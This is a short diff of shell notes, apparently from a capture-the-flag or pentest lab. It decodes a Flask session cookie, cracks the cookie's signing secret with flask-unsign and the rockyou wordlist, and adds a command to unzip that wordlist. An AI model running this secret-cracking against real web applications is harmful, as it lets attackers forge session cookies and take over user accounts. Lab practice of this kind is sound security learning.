@@ -5,3 +5,5 @@ echo 'eyJjc3JmIjoiUm9tMmZ0Y0dqUGpiUEh6XzhGclUySmFGcUl0bUVlb3cifQ' | base64 -d
 
 
 flask-unsign --unsign --cookie 'eyJjc3JmIjoiUm9tMmZ0Y0dqUGpiUEh6XzhGclUySmFGcUl0bUVlb3cifQ.asp2kQ.wfTretAQPaWOGQXWpGmiQo8dOgI' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
+
+gunzip -k /usr/share/wordlists/rockyou.txt.gz
